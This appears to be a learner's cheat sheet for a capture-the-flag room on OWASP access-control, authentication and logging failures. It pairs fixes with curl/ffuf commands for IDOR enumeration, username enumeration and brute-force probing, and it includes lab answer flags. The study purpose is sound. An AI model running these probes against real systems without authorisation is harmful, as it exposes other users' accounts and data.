
# 47.SAL1 — OWASP Top 10 (2025): IAAA Failures — Cheat Sheet

> Focus: A01 Broken Access Control, A07 Authentication Failures, A09 Logging & Alerting Failures — all framed by the IAAA model (Identity, Authentication, Authorisation, Accountability). 

---

## TL;DR

* **IAAA chain**: Identity → Authentication → Authorisation → Accountability. You can’t safely skip any step. 
* **A01** (Broken Access Control): Never trust client-side state; enforce **server-side** authorisation on **every** request. Watch for IDORs and privilege escalation paths. 
* **A07** (Auth Failures): Prevent username enumeration, rate-limit/lock out brute force, harden session management, and validate the full login/registration flow. 
* **A09** (Logging & Alerting Failures): Log the full auth lifecycle, centralise off-host, retain, and **alert** on anomalies (brute-force bursts, privilege elevation). 
* **Hands-on notes from the room**: Horizontal escalation demo and flags for practice are included in the material (e.g., `THM{Found.the.Millionare!}`). 

---

## Mental Model — IAAA

* **Identity**: Unique account (e.g., email/ID).
* **Authentication**: Prove identity (password, OTP, passkey).
* **Authorisation**: What the identity can do.
* **Accountability**: Record & alert on user actions.
  These map directly to A07 (Auth), A01 (AuthZ), and A09 (Accountability).

## A01 — Broken Access Control (incl. IDOR)

### What to look for

* URLs or parameters referencing object IDs (e.g., `?id=7`). Changing to another ID grants access (IDOR).
* Horizontal vs. Vertical privilege escalation. 

### Quick tests (commands)

```bash
# 1) Manual IDOR probe with curl (compare responses & codes)
curl -i "https://target/app?accountID=7"
curl -i "https://target/app?accountID=6"   # should be denied unless same user

# 2) Grep for sensitive markers (balances, emails) in responses
curl -s "https://target/app?accountID=6" | grep -Ei "balance|email|ssn"

# 3) Enumerate predictable IDs (101–150) and diff lengths
for i in $(seq 101 150); do
  len=$(curl -s "https://target/app?accountID=$i" | wc -c)
  echo "$i,$len"
done | sort -t, -k2 -n

# 4) Fuzz parameter names for hidden object keys
ffuf -u "https://target/app?FUZZ=1" -w params.txt -fs 0
```

### Fix it

* Enforce **server-side** checks on every request (deny by default).
* Use object-level permission checks, indirect references, and consistent 403/404 handling.
* Centralise AuthZ logic; don’t rely on client-side UI gating.
  (See the conclusion checklist). 

### From the room’s demo (example)

* **Horizontal** escalation was demonstrated (accessing another user’s data without new roles). 
* Practice flag displayed: `THM{Found.the.Millionare!}`.

## A07 — Authentication Failures

### What to look for

* Username enumeration (different messages/timing).
* Weak password policy; **no** rate-limit/lockout.
* Logic flaws in registration or case-handling (e.g., treat `aDmiN` as `admin`).
* Insecure sessions/cookies. 

### Quick tests (commands)

```bash
# 1) Username enumeration via differential responses
while read u; do
  curl -s -X POST https://target/login -d "user=$u&pass=P@ss" | \
    grep -E "does not exist|invalid password|try again" && echo "-> $u"
done < users.txt

# 2) Basic throttling / lockout probe (watch for 429/lockout)
for i in {1..20}; do
  curl -s -o /dev/null -w "%{http_code}\n" \
       -X POST https://target/login -d "user=admin&pass=wrong$i"
done

# 3) Registration case-collisions
curl -s -X POST https://target/register -d "user=aDmiN&pass=Temp123!"
```

### Fix it

* Canonicalise usernames (e.g., lowercase), enforce unique index **on canonical form**, and return uniform responses.
* Add rate limiting/lockouts, MFA, & secure session rotation on password/role changes. 

### From the room’s demo (example)

* Registration/login confusion let a user access **admin** dashboard; flag: `THM{Account.confusion.FTW!}`.

## A09 — Logging & Alerting Failures (Accountability)

### What to look for

* Missing/weak logs for auth attempts, session activity, privilege changes.
* No alerts on brute force or suspicious endpoints.
* Logs stored locally without integrity/retention. 

### Quick checks (queries & commands)

```bash
# 1) Grep server logs for brute-force bursts
grep -E "POST /login" access.log | awk '{print $1}' | sort | uniq -c | sort -nr | head

# 2) Identify successful admin access after failures
grep -E "200 .* /login.*user=admin" access.log -n

# 3) SIEM examples (Elastic / Splunk-ish pseudonyms)
# Elastic DSL-like:
event.category:authentication AND http.response.status_code:[400 TO 499]
| stats count by source.ip
```

### From the room’s demo (example)

* Brute-forcer IP: **203.0.113.45**; compromised user: **admin**; sensitive endpoint hit: **/supersecretadminstuff**.  

### Fix it

* Log **full auth lifecycle** (fail/success, password/2FA/role changes, admin actions) and centralise off-host with retention and alerting on anomalies.

## Gotchas (common pitfalls)

* **204/404 masking**: Returning 404 for all protected resources may hide real IDORs from testers; verify server-side checks still run.
* **Case/Unicode**: Usernames or email comparisons without normalisation (case, Unicode look-alikes) can bypass uniqueness checks (e.g., `aDmiN`). 
* **Session rotation**: Not rotating session IDs after auth or role change leaves session fixation windows.
* **Logs without context**: If logs lack **who/when/where** (user, IP, timestamp, action) you can’t reconstruct incidents.

## Example Playbook (Safe & Fast)

```bash
# 1) Crawl a few pages, collect candidate IDs
cat ids.txt | while read id; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target/app?accountID=$id")
  len=$(curl -s "https://target/app?accountID=$id" | wc -c)
  printf "%s,%s,%s\n" "$id" "$code" "$len"
done | tee idor_scan.csv

# 2) Probe auth messages for enumeration
while read u; do
  curl -s -X POST https://target/login -d "user=$u&pass=X" | \
    sed -n '1,10p' | tr -d '\n' | sed 's/ \+/ /g' | head -c 120; echo " <- $u"
done < users.txt

# 3) Quick log review (if you have access)
grep -E "(/login|/admin|/role|/supersecret)" access.log | tail -n 50
```
